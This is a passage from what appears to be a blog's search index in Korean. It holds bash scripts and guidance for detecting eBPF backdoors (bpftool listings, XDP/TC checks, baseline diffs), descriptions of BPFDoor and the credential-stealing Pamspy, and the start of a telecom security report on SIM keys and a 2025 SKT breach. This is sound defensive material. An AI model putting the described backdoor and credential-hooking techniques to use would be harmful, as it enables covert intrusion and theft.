/proc/$pid/exe 2\u0026gt;/dev/null) if [[ $exe_path == *\u0026#34;(deleted)\u0026#34; ]]; then if [ -r /proc/$pid/net/packet ] \u0026amp;\u0026amp; [ -s /proc/$pid/net/packet ]; then cmdline=$(ps -p $pid -o cmd= 2\u0026gt;/dev/null) if [[ ! $cmdline =~ \u0026#34;tcpdump|wireshark|dhclient\u0026#34; ]]; then echo \u0026#34;[!] Suspicious process detected:\u0026#34; echo \u0026#34; - PID: $pid\u0026#34; echo \u0026#34; - Command: $cmdline\u0026#34; echo \u0026#34; - Deleted executable: $exe_path\u0026#34; echo \u0026#34; - BPF socket is active\u0026#34; ss -p -n 2\u0026gt;/dev/null | grep \u0026#34;pid=$pid,\u0026#34; | awk \u0026#39;{print \u0026#34; - Network: \u0026#34; $0}\u0026#39; echo \u0026#34;\u0026#34; found=1 fi fi fi done [ $found -eq 0 ] \u0026amp;\u0026amp; echo \u0026#34;[*] No suspicious processes found.\u0026#34; echo \u0026#34;[*] Detection completed.\u0026#34; 주의사항 이 스크립트는 프로세스 레벨에서 간단한 힌트만 제공하는 경량 탐지 도구입니다. 고급 eBPF 루트킷은 /proc 정보까지 조작할 수 있으므로, 이 스크립트만으로는 완전한 보장이 되지 않습니다. 커널 무결성 보호 모듈(예: LKRG)과 함께 사용할 것을 강력히 권장합니다. Without kernel integrity protection like LKRG, even detection results can be faked.\nOpenStack 환경에서의 eBPF 백도어 점검 방법 OpenStack 환경에서는 호스트 OS(KVM 하이퍼바이저)에서 발생하는 eBPF 활동을 직접 검사할 수 있지만, 추가적인 상호 작용 없이는 게스트 VM 내부의 eBPF 활동을 직접 관찰할 수 없습니다. 다음 명령을 사용하면 OpenStack 환경의 호스트 OS에서 게스트 VM 내부의 eBPF 활동을 직접 검사할 수 있습니다.\n사용법 openstack server ssh \u0026ndash;vm-id \u0026ldquo;$VM_ID\u0026rdquo; \u0026ndash; bash -c \u0026ldquo;$(cat scan_bpf.sh)\u0026rdquo; \u0026gt; \u0026ldquo;result_${VM_ID}.txt\u0026rdquo; 2\u0026gt;\u0026amp;1\nbpftool을 이용한 점검 스크립트(scan_bpf.sh) #!/bin/bash # List all BPF programs echo \u0026#34;[*] Listing currently loaded BPF programs...\u0026#34; bpftool prog show # List all BPF maps echo \u0026#34;[*] Listing currently loaded BPF maps...\u0026#34; bpftool map show # Optional: Check for unexpected XDP attachments echo \u0026#34;[*] Checking for XDP programs attached to network interfaces...\u0026#34; for iface in $(ls /sys/class/net/); do ip link show dev \u0026#34;$iface\u0026#34; | grep -q \u0026#34;xdp\u0026#34; \u0026amp;\u0026amp; echo \u0026#34;[!] XDP attached: $iface\u0026#34; done # Optional: Check for TC filters echo \u0026#34;[*] Checking for TC filters...\u0026#34; for iface in $(ls /sys/class/net/); do tc filter show dev \u0026#34;$iface\u0026#34; 2\u0026gt;/dev/null | grep -i \u0026#34;bpf\u0026#34; \u0026amp;\u0026amp; echo \u0026#34;[!] BPF TC filter detected on: $iface\u0026#34; done echo \u0026#34;[*] BPF scan completed.\u0026#34; 스크립트 상세 설명 bpftool prog show: 현재 커널에 로드되어 있는 eBPF 프로그램 전체 목록을 출력합니다. 악성 BPF 프로그램이 로드되어 있을 수 있으므로 필수 점검 항목입니다. bpftool map show: BPF 프로그램이 사용하는 데이터 맵(BPF map)을 모두 출력합니다. C2 명령 제어나 세션 유지에 악용될 수 있는 맵을 탐지하는 데 사용합니다. XDP (eXpress Data Path) attachment 검사: ip link show 명령으로 각 네트워크 인터페이스에 XDP 프로그램이 붙어 있는지 검사합니다. XDP는 NIC(Level 2)에서 바로 패킷을 가로채는 고속 패스 기술로, BPFDoor 같은 백도어가 은밀히 트래픽을 조작하거나 필터링하는 데 사용될 수 있습니다. TC (Traffic Control) filter 검사: tc filter show 명령으로 인터페이스에 연결된 BPF 기반 트래픽 필터를 확인합니다. TC 필터는 네트워크 흐름을 조작하거나 특정 조건에서만 통신을 허용/차단하는 데 악용될 수 있습니다. 요약: bpftool 스크립트는 프로그램, 맵, XDP, TC 필터 네 가지 핵심 지점을 점검하여, OpenStack 호스트 수준에서 eBPF 백도어의 흔적을 조기에 탐지할 수 있습니다.\n추가 고급 방법: Guest OS 공통 패턴 제거 및 이상 징후 필터링 bpftool을 통해 수집한 모든 BPF 프로그램 정보는 OpenStack Hypervisor(KVM) 기준, 게스트 VM마다 공통적으로 로드된 정상 프로그램들도 포함되어 있습니다.\n이때, 모든 Guest OS에 공통적으로 존재하는 정상 eBPF 프로그램은 필터링하고, 튀는(비정상적인) 프로그램만 추출하는 방식으로 점검 효율을 높일 수 있습니다.\n간단한 필터링 스크립트 예시 #!/bin/bash # Collect current BPF programs bpftool prog show \u0026gt; /tmp/bpf_prog_list_all.txt # Define known common patterns (adjust based on your environment) COMMON_PATTERNS=(\u0026#34;kube-proxy\u0026#34; \u0026#34;cilium\u0026#34; \u0026#34;flannel\u0026#34; \u0026#34;calico\u0026#34; \u0026#34;ovs-vswitchd\u0026#34; \u0026#34;normal VM agent\u0026#34;) # Filter out common entries grep -v -E \u0026#34;$(IFS=\u0026#39;|\u0026#39;; echo \u0026#34;${COMMON_PATTERNS[*]}\u0026#34;)\u0026#34; /tmp/bpf_prog_list_all.txt \u0026gt; /tmp/bpf_prog_suspicious.txt echo \u0026#34;[*] Suspicious BPF programs after filtering:\u0026#34; cat /tmp/bpf_prog_suspicious.txt 설명 COMMON_PATTERNS: OpenStack 환경에서 VM들이 공통으로 사용하는 정상적인 BPF 프로그램 이름을 배열로 설정합니다. grep -v -E: 정상 패턴에 일치하지 않는 항목만 남깁니다. 결과 파일: /tmp/bpf_prog_suspicious.txt에 비정상적으로 보이는 항목만 남겨 분석합니다. 요약: 공통 정상 패턴을 제거하고 튀는 것만 보는 방식으로 필터링하면, OpenStack 호스트 수준에서도 eBPF 백도어를 훨씬 빠르게 식별할 수 있습니다.\n자동 학습 기반 공통 패턴 갱신 (diff 방식) 시간이 지남에 따라 Guest OS 공통 패턴은 변경될 수 있습니다. 따라서 수동으로 패턴을 관리하는 대신, 과거와 현재의 bpftool 결과를 비교(diff)하여 자동으로 갱신할 수 있습니다.\n자동 학습 스크립트 예시 #!/bin/bash BASELINE_FILE=\u0026#34;/opt/bpf_baseline.txt\u0026#34; CURRENT_FILE=\u0026#34;/tmp/bpf_current.txt\u0026#34; NEW_SUSPICIOUS_FILE=\u0026#34;/tmp/bpf_diff_suspicious.txt\u0026#34; # Collect current BPF programs bpftool prog show \u0026gt; \u0026#34;$CURRENT_FILE\u0026#34; # If no baseline exists, create one if [ ! -f \u0026#34;$BASELINE_FILE\u0026#34; ]; then echo \u0026#34;[*] No baseline found. Creating initial baseline...\u0026#34; cp \u0026#34;$CURRENT_FILE\u0026#34; \u0026#34;$BASELINE_FILE\u0026#34; exit 0 fi # Compare current with baseline echo \u0026#34;[*] Comparing current BPF programs with baseline...\u0026#34; diff --unchanged-line-format= --old-line-format= \u0026#34;$BASELINE_FILE\u0026#34; --new-line-format=\u0026#39;%L\u0026#39; \u0026#34;$CURRENT_FILE\u0026#34; \u0026gt; \u0026#34;$NEW_SUSPICIOUS_FILE\u0026#34; echo \u0026#34;[*] Newly detected suspicious BPF programs:\u0026#34; cat \u0026#34;$NEW_SUSPICIOUS_FILE\u0026#34; 설명 BASELINE_FILE: 정상적인 BPF 프로그램 목록(기준)을 저장합니다. CURRENT_FILE: 현재 스캔한 BPF 프로그램 목록입니다. diff 명령어를 사용해 기준과 현재를 비교하고, 새로운 항목만 추출합니다. 새로운 eBPF 프로그램이 발견되면 바로 탐지할 수 있습니다. 요약: 정기적으로 bpftool 스캔 결과를 저장하고, diff를 통해 변화를 추적하면 자동으로 튀는 프로그램만 선별할 수 있습니다.\nvSphere + VMware NSX 환경에서의 eBPF 백도어 대응 vSphere(ESXi) 환경에서는 게스트 OS 내부 감시는 어렵지만, NSX를 통해 네트워크 단에서 이상 행위를 감지할 수 있습니다.\n가능한 탐지 방향 방법 설명 Distributed Firewall(DFW) 규칙 활용 예상치 못한 outbound 포트, C2 서버 연결 시도를 탐지하거나 차단 NSX IDS/IPS 기능 활성화 BPFDoor 스타일 통신 패턴(비정상 UDP, ICMP 터널링 등)을 탐지 Flow Analytics 활용 VM 간 비정상 통신(East-West Movement) 흐름을 NSX가 분석하고 이상 징후 감지 NSX Threat Intelligence NSX ATP(Advanced Threat Protection) 모듈이 활성화된 경우 Known IOC 매칭 가능 주의사항 NSX는 커널 내부 변조를 직접 탐지하지 못합니다. (네트워크 관점에서 탐지) 게스트 OS 내부 이상 행위에 대한 대응은 여전히 필요합니다. (Tracee, EDR 등 추가 권장) \u0026ldquo;vSphere 환경에서는 NSX를 활용해 비정상 네트워크 패턴을 탐지하고, 게스트 OS 내부에서는 별도의 런타임 보안 도구로 커널 활동을 모니터링하는 이중 구조가 가장 효과적이다.\u0026rdquo;\n공개된 eBPF 백도어 탐지 프레임워크 및 도구 최근 공개된 여러 오픈소스 도구와 프레임워크가 eBPF 악성 활용을 탐지하기 위해 개발되었습니다. 주요 도구와 그 특징은 다음과 같습니다:\n도구/프레임워크 접근 방식 및 주요 기능 비고 Tracee (Aqua Security) eBPF 기반 실시간 모니터링 도구로, 커널 이벤트를 추적하여 악성 행위를 탐지. 특히 eBPF 프로그램이 kprobe/tracepoint 등에 attach되는 순간 발생하는 bpf_attach 이벤트를 포착해 어떤 eBPF 프로그램(ID, 이름, 타입, 사용된 helper 함수 등)이 로드되는지 기록함​scitepress.org​aquasec.com. 오픈소스 (GitHub 제공)​scitepress.org. Aqua Security 연구팀이 개발하여 eBPF 루트킷과 멀웨어 탐지에 활용​scitepress.org. ebpfkit-monitor Datadog 연구원(Fournier)이 개발한 전용 탐지 툴로, eBPF 바이트코드를 정적 분석하거나 실행 시 모니터링하여 악의적인 eBPF 로딩을 탐지함. 원래 eBPF 루트킷인 ebpfkit을 검출하기 위해 설계되었으며, 의심스러운 eBPF 프로그램 로딩을 감시하고 차단 가능​scitepress.org. 오픈소스 (GitHub 제공). eBPF 루트킷 ebpfkit 대응으로 개발​github.com. Falco (CNCF/Sysdig) 호스트 침입 탐지(HIDS) 도구로, eBPF를 통해 시스템 콜 등을 모니터링하여 악성 행위를 탐지. 최근 버전에서는 bpf() 시스템콜 호출을 감시함으로써 권한 상승을 위한 eBPF 악용 시도를 탐지하고 경보를 발생시킬 수 있음​sysdig.com. 오픈소스 CNCF 프로젝트. 주로 컨테이너/클라우드 환경에서 활용되며, 정책을 설정해 eBPF 관련 이벤트를 추적 가능. bpftool (리눅스 기본 도구) 리눅스 커널에 내장된 BPF 디버깅/관리 도구로, 현재 로드된 eBPF 프로그램, 맵, 링크 정보를 나열할 수 있음. 수동 조사 시 bpftool prog, bpftool map, bpftool link, bpftool perf 등의 명령으로 의심스러운 eBPF 프로그램(예: kprobe 유형 백도어)과 연결 지점(어떤 함수에 붙었는지)을 확인 가능​redcanary.com​redcanary.com. 리눅스 4.x 이상에서 제공. 수동 조사나 스크립트로 활용하여 비정상적 BPF 객체(예: 알 수 없는 이름의 kprobe 프로그램 등) 탐지에 유용​redcanary.com​redcanary.com. Volatility eBPF 플러그인 메모리 포렌식 도구 Volatility용 플러그인으로, 메모리 덤프에서 eBPF 프로그램을 추출하고 분석함. 커널 내부의 prog_idr 구조체를 탐색하여 로드된 모든 eBPF 바이트코드와 메타데이터(이름, 길이, 타입, 사용 helper 함수 등)를 수집​scitepress.org​scitepress.org. 이를 바탕으로 악성 가능성이 높은 eBPF 프로그램을 선별하는 **분류기(classifier)**를 제공. 연구용 도구 (2024년 학술 연구에서 공개​scitepress.org​scitepress.org). 실행 중인 시스템에서는 루트킷에 의해 우회될 수 있으나, 하이퍼바이저나 오프라인 메모리 덤프 분석에 활용하여 내부 관찰자를 회피한 탐지가 가능함​scitepress.org. 이들 도구는 각각 장단점과 적용 범위가 다릅니다. 예를 들어 Tracee와 Falco는 실시간 탐지에 강점이 있어, eBPF 백도어가 로드되는 순간 탐지하거나 실행 중 수상한 시스템콜 패턴을 식별합니다​scitepress.org​sysdig.com. 반면 Volatility 플러그인과 같은 포렌식 도구는 사후 분석에 유용하며, 이미 설치되어 은신 중인 루트킷도 하이퍼바이저 수준에서 메모리를 덤프하여 찾아낼 수 있습니다​scitepress.org. 이러한 도구들을 상황에 맞게 조합하면 다층적인 탐지 전략을 구축할 수 있습니다.\n최신 탐지 방법론 (2023~2025)과 연구 동향 최근 공개된 연구 논문, 보안 보고서, 기술 블로그에서는 eBPF 백도어 탐지를 위한 다양한 접근법과 개선 사항을 제시하고 있습니다. 주요한 방법론은 다음과 같습니다:\n실시간 로드 모니터링: 가장 효과적인 탐지는 eBPF 프로그램이 커널에 로드될 때 이루어집니다​redcanary.com. Red Canary에 따르면, eBPF 기반 멀웨어는 로드 시점을 놓치면 탐지가 극도로 어려워지므로 EDR(Endpoint Detection \u0026amp; Response) 솔루션이나 커스텀 모니터링 도구가 bpf 시스템콜 호출, kprobe 등록 등의 이벤트를 실시간 감시해야 합니다​redcanary.com​redcanary.com. Aqua Security는 이와 관련해 Tracee 도구에 bpf_attach 이벤트 모니터링을 추가하여, 악성 eBPF 프로그램이 kprobe/uretprobe 등에 붙는 순간 자동으로 탐지하도록 구현했습니다​scitepress.org​aquasec.com. 실제로 2023년 Aqua 측은 PAM 인증 모듈을 훔쳐보는 Pamspy 멀웨어를 Tracee로 탐지해냈는데, pam_get_authtok 함수를 후킹한 eBPF uretprobe 프로그램(trace_pam_get_a)의 로드 이벤트를 포착함으로써 평문 크리덴셜 탈취 시도를 적발할 수 있었습니다​aquasec.com. 이처럼 커널 내부 이벤트에 대한 훅(hook) 모니터링은 최신 EDR과 오픈소스 도구에서 중요한 추세입니다.\n커널 내부 무결성 검사 및 제한: eBPF 백도어를 원천 차단하거나 탐지하기 위해 커널 자체에 보안장치를 두는 연구도 진행되고 있습니다. 예를 들어 Sysdig의 보고는, 최신 커널 설정에서 CONFIG_BPF_UNPRIV_DEFAULT_OFF를 통해 비권한 사용자에 의한 eBPF 사용을 막고, SYS_bpf 시스템콜을 루트만 사용하도록 제한하는 것을 권고합니다​sysdig.com. 또한 eBPF에 의한 커널 함수 변조를 막기 위해 CONFIG_BPF_KPROBE_OVERRIDE와 같은 옵션을 비활성화하고, 불필요한 kprobe 기능이나 eBPF 기능은 아예 컴파일 제외하는 식으로 공격 표면을 줄이는 전략도 제시됩니다​redcanary.com. 이러한 설정은 탐지라기보다는 예방적 수단이지만, eBPF 악용을 사전에 차단함으로써 탐지 부담을 낮추는 효과가 있습니다.\n하이퍼바이저 기반 감사(Audit): 호스트 OS 내부에서 동작하는 탐지기는 동일한 커널 권한을 가진 루트킷에 의해 우회될 위험이 있습니다​blog.thalium.re. 이를 보완하고자, 2023~2024년 연구들은 하이퍼바이저 레벨에서 게스트의 eBPF 동작을 감사하는 방안을 모색했습니다. 예를 들어 2023년 SIGCOMM 워크숍의 HyperBee 연구는, 하이퍼바이저가 게스트 OS에 로드되는 모든 eBPF 프로그램을 사전에 검사하도록 하여 악성 코드를 차단하는 프레임워크를 제안했습니다​conferences.sigcomm.org. 마찬가지로 2024년 한 연구에서는 경량 하이퍼바이저를 이용해 게스트 메모리를 스냅샷하고, Volatility 플러그인으로 eBPF 프로그램을 추출한 뒤 의심스러운 helper 함수 호출 여부 등을 분류하는 기법을 선보였습니다​scitepress.org​scitepress.org. 이러한 외부 감사 기법들은 은폐된 루트킷도 투명하게 들여다볼 수 있다는 점에서 향후 실용화 가능성이 주목됩니다.\n시스템 후속 검사 및 헌팅: 만약 실시간 탐지에 실패했다면, 보안 담당자에 의한 수동 헌팅과 분석이 필요합니다. 최신 보고서들은 관리자가 의심 상황에서 다음 사항을 점검하라고 조언합니다:\n예상치 못한 kprobe 존재 여부: /sys/kernel/debug/kprobes/list를 확인하여 등록된 kprobe 중 평소 시스템에서는 볼 수 없는 후킹 지점이 있는지 살펴봅니다​redcanary.com. 예를 들어 사용자 공간에 로드한 적 없는 함수에 대한 kprobe가 걸려 있다면 루트킷을 의심해야 합니다.\n로드된 eBPF 프로그램 나열: bpftool prog 명령으로 현재 메모리에 상주하는 eBPF 프로그램 목록을 확인합니다. 일반적인 시스템에도 cgroup_skb 등 몇몇 eBPF 프로그램이 있을 수 있지만, kprobe 유형 프로그램이나 이상한 이름/경로로 로드된 것이 있다면 주의해야 합니다​redcanary.com. 또한 bpftool perf로 eBPF가 연결된 퍼프 이벤트(perf event) 정보를 보면, 어떤 PID가 어떤 커널 함수에 kprobe/uretprobe를 걸었는지 알 수 있어 수상한 후킹을 찾아낼 수 있습니다​redcanary.com.\n네트워크 훅 및 XDP 확인: ip link show로 네트워크 인터페이스에 XDP 프로그램이 붙어있는지 (prog/xdp id ... 형태) 확인하고​redcanary.com, tc filter show로 트래픽 필터에 eBPF가 사용되었는지 검사합니다. 일반적인 시스템에서는 사용되지 않는 XDP나 TC 필터가 활성화되어 있다면 의심해볼 수 있습니다.\nBPF 가상파일시스템(bpffs) 점검: /sys/fs/bpf/ 디렉토리에 pinning된 객체(eBPF 프로그램이나 맵)가 존재하는지 확인합니다​redcanary.com. 공격자는 eBPF 객체를 pin시켜 영구 저장해두기도 하므로, 알 수 없는 핀 객체가 있다면 분석이 필요합니다.\n시스템 로그 모니터링: 커널 로그(dmesg) 등에 BPF 관련 경고나 오류 메시지가 남았는지 확인합니다. 예를 들어 권한 없는 사용자가 BPF를 시도하다 실패한 로그, 또는 bpf_override_return 등의 위험한 helper 함수 사용 경고가 기록되었을 수 있습니다.\n이상의 방법들은 2023~2024년 보안 블로그와 보고서들에서 공통적으로 권장되는 후속 탐지 기법들입니다​redcanary.com​redcanary.com. 핵심은 시스템 상태를 다각도로 검사하여 eBPF 백도어의 흔적을 찾는 것으로, 일반적인 패턴과 벗어나는 BPF 관련 항목은 모두 수집하여 심층 분석해야 합니다.\n실제 사례: eBPF 백도어 탐지와 대응 BPFDoor 백도어 사례는 eBPF 탐지의 중요성을 일깨워준 대표적 사건입니다. BPFDoor는 2010년대 후반부터 발견된 리눅스 백도어로, 리눅스의 클래식 BPF(cBPF) 필터를 이용해 특정 매직 패킷을 감지하면 공격자의 쉘 접속을 열어주는 방식으로 동작했습니다​trendmicro.com​trendmicro.com. 방화벽 규칙을 회피하고 포트 스캐닝으로 드러나지 않는 기법 탓에 “문이 없는 백도어”라고도 불렸습니다. 2022년 이 백도어가 공개된 후, 2023년에는 APT 공격자들이 BPF 필터 복잡도를 높이는 등 백도어를 고도화하여 계속 활용한 정황이 포착되었습니다​trendmicro.com​trendmicro.com.\n보안 업체들은 BPFDoor 탐지를 위해 네트워크 및 호스트 수준의 징후를 모두 활용했습니다. 예를 들어 Trend Micro는 자사 제품에 BPFDoor의 BPF 필터 패턴을 식별하는 시그니처를 추가하여 탐지율을 높였으며​trendmicro.com​trendmicro.com, 침해 조사 시 setsockopt로 BPF 필터를 삽입하는 행위를 로그에서 찾아내거나, 수상한 raw 소켓을 보유한 프로세스를 추적하는 방식으로 BPFDoor를 찾아냈습니다. 또한 최신 변종 분석을 통해 백도어 활성화 트리거 패킷의 매직 넘버나 BPF 명령어 수 등을 파악함으로써, 이후 샘플에서는 필터 명령이 6배 증가하는 등 진화 양상을 확인하고 방어에 반영했습니다​trendmicro.com​trendmicro.com. BPFDoor 사례는 eBPF 기반 백도어도 면밀히 탐지 가능함을 보여주었지만, 동시에 공격자들도 대응책을 우회하도록 기법을 꾸준히 업데이트하고 있음을 시사합니다.\n다른 실례로 앞서 언급한 Pamspy 멀웨어의 탐지 과정이 있습니다. Pamspy는 eBPF uretprobe를 이용해 libpam.so의 인증 함수 결과를 가로챈 신종 멀웨어인데, Aqua Security 연구진이 Tracee 오픈소스 도구로 이 공격을 탐지해 발표했습니다. Tracee의 경고 로그에는 pam_get_authtok 함수를 후킹한 eBPF 프로그램의 이름과 메모리 오프셋 등이 기록되었고, 이를 통해 시스템 내 숨겨진 백도어 프로세스 없이도 eBPF만으로 자격 증명을 유출하는 공격을 식별해낸 사례입니다​aquasec.com. 이처럼 최신 침해 사례에서는 eBPF 탐지 도구의 활용이 점점 중요해지고 있으며, 커뮤니티와 업체들이 관련 정보를 공유하면서 방어 전략을 발전시키고 있습니다.\n대응 전략 및 실용적 권고사항 eBPF 기반 백도어에 대응하기 위해서는 다층적인 탐지와 예방 전략이 요구됩니다. 아래는 실무적으로 적용할 수 있는 권고사항입니다:\n권한 관리 및 하드닝: 서버에서 eBPF가 불필요하다면 아예 커널 컴파일 옵션이나 sysctl 설정으로 비활성화해놓습니다​sysdig.com. 특히 비권한 사용자(CAP_BPF 권한 미보유)가 eBPF를 사용할 수 없도록 하고, CONFIG_BPF_JIT_ALWAYS_ON 등을 통해 eBPF JIT의 악용 가능성을 낮춥니다. 또한 사용하지 않는 kprobe/tracepoint 기능은 꺼두는 것이 좋습니다​redcanary.com.\n실시간 모니터링 도구 활용: 운영 환경에 오픈소스 HIDS/EDR 도구를 배포하여 eBPF 관련 이벤트를 모니터링합니다. 예를 들어 Falco를 사용하면 bpf() 시스템콜이나 perf_event_open 호출을 룰(rule) 기반으로 감시해 이상 행동을 경고할 수 있고​sysdig.com, Tracee를 데몬으로 실행하면 루트킷이 커널에 훅을 거는 순간 상세 정보를 로그로 남길 수 있습니다​scitepress.org. 이러한 도구는 가볍게 컨테이너화하여 배포할 수도 있으므로, 상시 탐지 체계로 활용합니다.\n정기적 무결성 검사: 크론(cron) 등을 활용해 일정 주기마다 bpftool을 실행하고 로드된 eBPF 프로그램 목록을 덤프하도록 스크립트를 구성합니다. 이전 출력과 **비교(diff)**하여 신규로 등장한 프로그램이나 변화가 있는지를 체크하고, 발견 시 보안 담당자에게 알림을 주도록 합니다. 특히 프로덕션 환경에서 평소 로드되지 않는 kprobe, tracepoint 유형의 프로그램 ID가 새로 생겼다면 즉시 분석이 필요합니다​redcanary.com. 이와 함께 /sys/fs/bpf 디렉토리 내용과 /sys/kernel/debug/kprobes/list도 정기 확인하면 은밀하게 상주하는 백도어를 걸러내는 데 도움이 됩니다​redcanary.com​redcanary.com.\n포렌식 대비: 고급 공격에 대비해 메모리 포렌식 절차를 마련해 둡니다. 중요 서버에는 가능하다면 하이퍼바이저 기반 스냅샷이나 원격 메모리 덤프 수단을 준비하고, 사고 발생 시 Volatility 플러그인 등을 활용해 커널 메모리를 분석함으로써 루트킷이 숨긴 흔적까지 탐지할 수 있도록 합니다​scitepress.org. 이러한 포렌식은 최후의 수단이지만, eBPF 백도어처럼 흔적을 남기지 않는 공격에 대한 마지막 안전망이 될 수 있습니다.\n업데이트 및 정보 공유: eBPF 보안은 최신 연구와 사례 공유가 활발히 이루어지는 분야입니다. 관리자들은 보안 업체의 블로그, 컨퍼런스 자료를 지속적으로 팔로업하여 **최신 IOC(Indicators of Compromise)**와 탐지 룰을 업데이트해야 합니다. 예를 들어 BPFDoor의 새로운 변종에 대응한 시그니처나, GitHub에 공개된 새로운 eBPF 루트킷 샘플 등을 빠르게 입수하여 자체적인 탐지 규칙에 반영해야 합니다.\n결론적으로, eBPF 백도어 탐지는 최신 기술 동향을 반영한 다층적 접근이 요구됩니다. 실시간 모니터링과 사후 검증, 예방적 하드닝을 조합하여 대응하고, 커뮤니티의 오픈소스 도구와 정보를 적극 활용하는 것이 중요합니다. eBPF는 향후에도 공격자에게 매력적인 도구인 만큼, 수비 측에서도 eBPF의 힘을 역이용해 커널을 감시하고 위협을 조기에 차단하는 노력이 필요합니다​sysdig.com. 지속적인 연구 개발과 정보 공유를 통해, 보안 전문가들은 새로운 eBPF 기반 공격 기법에도 한 발 앞선 탐지 능력을 갖추어 나가야 할 것입니다​redcanary.com.\n참고 자료: 주요 내용은 2023~2025년에 발표된 공개 자료를 참고하였으며, Aqua Security, Sysdig, Trend Micro, Red Canary 등의 공식 블로그와 학술 연구​scitepress.org​scitepress.org를 기반으로 정리되었습니다. 각주에 표시된 출처를 통해 세부 내용을 확인할 수 있습니다.\n📌 추가 참고: 국가용 보안요구사항에서도 커널 무결성 검증은 강화되어야 합니다 국가용 보안요구사항에서도 커널 무결성 검증은 \u0026lsquo;조건부 필수\u0026rsquo;로 규정되어 있습니다.\n하지만 중요 기반시설, 외부 노출 서버, 중요정보 처리 서버에서는 선택사항이 아니라 반드시 필수 요건으로 강화되어야 합니다.\n커널 무결성 검증 없이는 시스템의 보안성을 스스로 입증할 수 없습니다.\n📄 National security requirements reference (Korean): 국가정보원 국가용 보안요구사항 공식 링크 ※ 현재 기준(서버 공통보안요구사항 v3.0)에서는 운영체제 커널 또는 커널 레벨 모듈에 대해 \u0026lsquo;조건부 필수\u0026rsquo;로 무결성 검증 기능을 요구하고 있습니다.\n관련 자료 구분 이미지 국가용 보안요구사항 체계도 커널 무결성 검증 항목 (서버 공통보안요구사항 발췌) ","permalink":"https://windshock.github.io/ko/post/2025-04-29-ebpf-backdoor-detection-framework/","summary":"eBPF를 악용한 백도어 및 루트킷의 부상과 탐지 난제를 분석하고, Tracee, LKRG, bpftool, Hypervisor 기반 감사 등 최신 대응 방법과 연구 동향(2023~2025)을 종합 정리합니다.","title":"eBPF 기반 백도어 탐지 프레임워크와 최신 방법론"},{"content":"통신 보안 심층 분석 리포트 1. 통신 인프라의 심장: Ki와 가입자 인증 구조 Ki란 무엇인가 **Ki(Key)**는 이동통신 가입자를 식별하고 인증하는 절대 비밀키이다. USIM 카드 내부와 통신사 코어 인증 서버(HLR/HSS/5GC)에 저장되며, 외부로 절대 노출되지 않는다. Ki 기반으로 난수(RAND) 및 응답(SRES)을 교환하여 통신 인증이 이루어진다. 만약 Ki가 유출되면?\n→ 공격자가 \u0026ldquo;가짜 USIM\u0026quot;을 제작해 통신사 인증을 통과할 수 있다.\n→ 통화 가로채기, 위치 추적, 데이터 탈취 등 심각한 피해로 이어진다.\n가입자 인증 흐름 2G (GSM): RAND → SRES 생성 및 전송 → 통신사 검증 3G (UMTS) / 4G (LTE): AKA 프로토콜 사용, RES 응답 비교 5G (SA 구조): SUPI 보호 → SUCI(암호화된 ID)만 네트워크에 전송 참조: 3GPP TS 33.102\n2. 5G NSA vs 5G SA: 구조적 차이와 보안성 비교 NSA 구조 (Non-Standalone) LTE Core(EPC)에 5G 무선망(NR)만 추가. 가입자 인증 및 세션 관리는 LTE 방식 그대로 유지. IMSI 평문 노출 위험 여전히 존재. SA 구조 (Standalone) 5G Core(5GC) 독립 구축. 공개키 기반 보호 강화 → SUPI를 암호화(SUCI)하여 전송. SUCI(SUPI Concealment):\n가입자는 SUPI를 통신사 공개키로 암호화한 SUCI로 전송. 통신사는 SUCI를 복호화하여 인증 절차 수행. 참조: 3GPP TS 33.501\n3. SKT 2025 해킹 사건: 기술 분석 사건 개요 2025년 4월 19일, SK텔레콤 코어망 서버에서 해킹 정황 발견. 약 2,300만 명의 USIM 정보 유출 가능성. 기술적 문제점 NSA 기반 평문 이동 위험. Ki 유출 시 USIM 복제 및 SIM 스와핑 공격 가능. 예상 공격 시나리오 코어 서버 침투 → 가입자 DB 접근 → 복제 USIM 제작 → 개인정보 탈취. 참조:\n연합뉴스 보도 SKT 공식 발표 4. 과거 주요 사례 심층 분석 Gemalto 해킹 사건 2010~2011년, NSA \u0026amp; GCHQ가 SIM 제조사 Gemalto 해킹 시도. 전 세계 SIM 암호화 키(Ki) 탈취 시도. 참조:\nThe Intercept - Great SIM Heist WIRED - Gemalto Hacked APT10 Operation Soft Cell 중국계 해커 그룹 APT10, 글로벌 통신사 코어망 침투. VIP 가입자 통화 기록, 위치 정보 대량 탈취. 참조:\nCybereason Operation Soft Cell 보고서 Circles SS7 감청 NSO Group 계열사 Circles, SS7 취약점을 활용한 감청 시스템 판매. 25개국 정부기관이 구매하여 통신 감청 활용. 참조:\nCitizen Lab - Running in Circles 5. 이동통신 보안 구조의 역사적 한계와 PKI 및 HSM 부재 비판 왜 초기 이동통신은 PKI를 적용하지 않았나? 2G/3G 시대에는 단말기의 CPU 성능, 배터리 용량, 그리고 통신 속도 모두 큰 제약이 있었다.\nRSA, ECC 같은 공개키 기반 암호 연산은 당시 기술 수준으로는 현실적으로 적용이 불가능했다. 공개키 연산을 위한 충분한 계산 자원도, 전력을 감당할 배터리 용량도 부족했다. 현실적 선택:\n→ 대칭키(Ki) 기반의 간단하고 빠른 인증 구조를 채택할 수밖에 없었다.\n그러나 문제점 가입자 식별자(IMSI)가 평문으로 무선망을 통해 전송되면서,\nIMSI Catcher(가짜 기지국) 공격이 가능해졌다. USIM에 저장된 Ki가 탈취될 경우,\nUSIM 복제를 통한 통신 사칭 공격이 이론적으로 가능해졌다. SIM 제조사, 통신사 등 공급망(Supply Chain)에서 발생할 수 있는\n키 유출 리스크가 과소평가되었다. 특히,\n당시에는 장기 키(Ki)를 보호하기 위한 HSM(Hardware Security Module) 같은\n강력한 하드웨어 기반 키 보호 기술의 적용도 이루어지지 않았다.\n서버 측 코어 장비(HLR/HSS 등)에서도\n명확한 물리적 키 분리나 보안 하드웨어 내부 연산 개념이 부족했다. 이로 인해 코어 서버가 침해당할 경우,\n가입자 인증 키(Ki)가 대규모로 유출될 수 있는 구조적 한계가 존재했다. 결국, 초기 이동통신 시스템은\n\u0026ldquo;빠른 상용화\u0026quot;와 \u0026ldquo;저비용 구현\u0026rdquo; 을 우선순위에 두면서\n보안 아키텍처의 심층 강화는 뒷전으로 밀린 결과를 낳았다.\n지금은 왜 PKI와 HSM이 필수인가? 오늘날,\n현대 단말은 공개키 암호화 연산(RSA, ECC)을 실시간으로 처리할 수 있고, 통신 지연도 극복할 수 있을 만큼 네트워크 성능이 발전했다. 따라서 통신 보안 강화를 위해 필수적으로 적용해야 할 것은:\nSUPI 암호화 (SUCI): 가입자 영구 식별자의 무선망 평문 전송 차단. TLS 보안 